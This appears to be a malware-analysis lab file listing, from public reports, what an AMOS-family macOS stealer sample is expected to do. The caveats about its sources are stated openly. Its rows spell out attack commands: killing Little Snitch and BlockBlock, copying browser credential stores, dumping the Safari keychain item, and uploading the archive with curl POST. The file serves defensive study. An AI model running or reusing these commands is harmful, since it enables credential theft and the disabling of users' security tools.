column1: # Bazaar-AMOS-fdcd5d21: what public reports say AMOS-family stealers do. Only what the articles state; written before the capture was read.
# Sample: MalwareBazaar, AMOS, x86_64 Mach-O, 442,752 bytes, file name u78676388, first seen 2026-11-16, sha256
# fdcd5d218a0cc440c6da0e7e4189d92f9d6792db48bedcf07137991f965ebc96.
# CAVEAT: no report covers this build. The behaviors below come from Objective-See's guest post "Catching macOS Stealers in the Wild"
# (Pablo Redondo Castro, 2026-04-01), about a sample it says is "probably related to AMOS Stealer": a ClickFix-delivered helper that runs
# obfuscated AppleScripts. This lab sample is a Mach-O run directly, so some rows may not apply to it, and a miss may mean the variant
# differs. The Iru article (Mayers and Lopez, 2024-03-01) adds only that AMOS Mach-Os decode their strings at run time and that an error
# dialog through osascript is common; it states no persistence, no commands and no network. Neither article lists MITRE ATT&CK IDs.
behavior
Runs system_profiler SPMemoryDataType and SPHardwareDataType and looks for QEMU, VMware or KVM before going on
Shows a fake password dialog through osascript (display dialog, hidden answer, titled "System Helper Installation")
Checks the typed password and shows the dialog again until it is correct (the article does not say how it checks)
Kills security tools: killall -9 "Little Snitch" and "BlockBlock", and launchctl unload of the LuLu plist
Copies browser data (Login Data, Cookies, Web Data, Local Extension Settings of Chrome, Brave, Edge, Opera, Firefox)
Copies the Apple Notes database and its media with cp -r to /tmp/exfil
Reads the Safari keychain item with security find-generic-password -ga 'Safari' -w, as administrator
Archives what it collected with tar -czf /tmp/archive.tar.gz
Uploads the archive with curl -X POST -F file=@/tmp/archive.tar.gz to an /upload endpoint (eslogger cannot see the network)
Writes a LaunchAgent named com.apple.mdworker.plist (label com.apple.systemupdate, RunAtLoad, KeepAlive) that runs the stealer
Loads that LaunchAgent with launchctl load
Keeps the typed password in a hidden file, ~/.pwd
